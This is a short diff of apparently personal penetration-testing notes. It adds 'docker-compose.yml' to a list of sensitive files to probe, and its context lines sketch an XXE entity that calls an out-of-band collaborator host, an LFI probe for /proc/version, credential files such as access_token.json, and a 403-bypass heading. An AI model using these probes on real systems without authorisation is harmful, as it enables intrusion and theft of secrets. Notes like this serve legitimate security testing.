@@ -186,6 +186,7 @@ can put "http://collaborator_ip" in <!ENTITY xxe SYSTEM "http://collaborator">
     3- http://google.com/direcotry/direcotry/file=/proc/version ==> add dircrotyies fuzzing to see if any of them accept parameter file lfi and try to add more and more 
     2- files access_token.json
       jsapi_ticket.json
+      docker-compose.yml
  -------------------------------------------------------------------------------------------
                                       403 PYPASS
                                       GET /admin HTTP/1.1
